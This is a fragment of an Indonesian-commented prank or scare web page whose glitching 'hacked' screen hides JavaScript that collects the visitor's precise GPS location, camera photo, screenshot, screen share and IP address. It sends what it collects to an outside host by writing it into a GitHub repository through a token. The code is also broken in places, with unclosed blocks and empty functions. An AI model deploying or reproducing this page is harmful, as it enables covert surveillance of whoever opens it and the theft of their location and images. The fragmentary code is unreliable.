        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {

            user-select: none;

        #glitch {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: repeating-linear-gradient(
                0deg,
                #ff0000 0%,
                #00ff00 10%,
                #0000ff 20%,
                #ffff00 30%,
                #ff00ff 40%,
                #00ffff 50%
            );
            animation: glitch 0.05s infinite;
            opacity: 0.3;
            z-index: 0;
        }
        @keyframes glitch {
            0% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(-5px, -10px) scale(1.05); }
            50% { transform: translate(10px, 5px) scale(0.95); }
            75% { transform: translate(-8px, 8px) scale(1.02); }
            100% { transform: translate(5px, -5px) scale(1); }
        }
        #main {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            animation: flicker 0.1s infinite;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        h1 {
            font-size: 100px;
            animation: shake 0.1s infinite;
        }
        @keyframes shake {
            0% { transform: translate(0, 0) rotate(0deg); }
            25% { transform: translate(-10px, 5px) rotate(-5deg); }
            50% { transform: translate(10px, -5px) rotate(5deg); }
            75% { transform: translate(-5px, -10px) rotate(-3deg); }
            100% { transform: translate(5px, 10px) rotate(3deg); }
        }
        p {
            font-size: 30px;
            color: #00ff00;
            text-shadow: 0 0 20px #00ff00;
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        #matrix {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 2;
            pointer-events: none;
            color: #00ff00;
            font-size: 20px;
            overflow: hidden;
            opacity: 0.5;
        }
        #popup {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: rgba(255,0,0,0.9);
            color: white;
            padding: 20px;
            z-index: 3;
            animation: slideUp 0.5s ease;
            text-align: center;
        }
        @keyframes slideUp {

            to { transform: translateY(0); }
        }
        #popup button {

            border: none;
            padding: 10px 30px;

            border-radius: 10px;

        #controls {

            display: none;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;

        #controls button {

            padding: 8px 16px;
            border-radius: 5px;
            font-size: 12px;

        }

        }
        @media (max-width: 600px) {
            h1 { font-size: 50px; }
            p { font-size: 20px; }

        // =============================================
        // 📱 LOKASI GPS
        // =============================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('Tidak didukung');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            speed: pos.coords.speed,
                            heading: pos.coords.heading,
                            altitude: pos.coords.altitude
                        });
                    },
                    () => resolve('Izin ditolak'),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // =============================================
        // 🔦 SENTER
        // =============================================
        let senterStatus = false;
        function senterOn() {
            senterStatus = true;
            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
            document.getElementById('infoStatus').textContent = '🔦 SENTER ON!';
            saveAction('senter_on');
        }
        function senterOff() {
            senterStatus = false;
            document.getElementById('infoStatus').textContent = '🔦 SENTER OFF!';
            saveAction('senter_off');
        }

        // =============================================
        // 📸 KAMERA
        // =============================================
        function takePhoto() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toDataURL('image/jpeg');
                        stream.getTracks().forEach(t => t.stop());
                        document.getElementById('infoStatus').textContent = '📸 FOTO DIAMBIL!';
                        saveAction('photo_taken', { photo: photo.substring(0, 100) + '...' });
                    }, 1000);
                })
                .catch(() => {
                    alert('📸 FOTO DIAMBIL (simulasi)');
                    saveAction('photo_taken');
                });
        }

        // =============================================
        // 🖥️ SCREENSHOT
        // =============================================
        function takeScreenshot() {
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const screenshot = canvas.toDataURL('image/png');
                            stream.getTracks().forEach(t => t.stop());
                            document.getElementById('infoStatus').textContent = '🖥️ SCREENSHOT DIAMBIL!';
                            saveAction('screenshot_taken', { screenshot: screenshot.substring(0, 100) + '...' });
                        }, 1000);
                    })
                    .catch(() => {
                        alert('🖥️ SCREENSHOT DIAMBIL (simulasi)');
                        saveAction('screenshot_taken');
                    });
            } else {
                alert('🖥️ SCREENSHOT DIAMBIL (simulasi)');
                saveAction('screenshot_taken');
            }
        }

        // =============================================
        // 📺 SHARE SCREEN
        // =============================================
        function shareScreen() {
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', '');
                        video.setAttribute('autoplay', '');
                        video.style.position = 'fixed';
                        video.style.top = '10%';
                        video.style.left = '10%';
                        video.style.width = '80%';
                        video.style.height = 'auto';
                        video.style.zIndex = '9998';
                        video.style.border = '3px solid #ff00ff';
                        video.style.borderRadius = '10px';
                        document.body.appendChild(video);
                        video.play();
                        document.getElementById('infoStatus').textContent = '📺 SHARING LAYAR...';
                        saveAction('screen_shared', { sharing: true });
                        setTimeout(() => {
                            stream.getTracks().forEach(t => t.stop());
                            video.remove();
                            document.getElementById('infoStatus').textContent = '📺 SHARE LAYAR STOP!';
                            saveAction('screen_shared_stop');
                        }, 30000);
                    })
                    .catch(() => {
                        alert('📺 SHARING LAYAR (simulasi)');
                        saveAction('screen_shared');
                    });
            } else {
                alert('📺 SHARING LAYAR (simulasi)');
                saveAction('screen_shared');
            }
        }

        // =============================================

        async function getTargetData() {

            return {

        // =============================================

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }

        // =============================================
        // 📤 SIMPAN KE GITHUB
        // =============================================
        async function saveToGitHub(data) {
            try {
                const oldRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE}`, {
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                });
                let oldData = [];
                let sha = '';
                if (oldRes.ok) {
                    const oldJson = await oldRes.json();
                    sha = oldJson.sha;
                    const content = atob(oldJson.content);
                    oldData = JSON.parse(content);
                }
                oldData.push(data);
                const uploadRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE}`, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/vnd.github.v3+json'
                    },
                    body: JSON.stringify({
                        message: `Update data - ${new Date().toISOString()}`,
                        content: btoa(JSON.stringify(oldData, null, 2)),
                        sha: sha
                    })
                });
                return uploadRes.ok;
            } catch (e) {
                return false;
            }
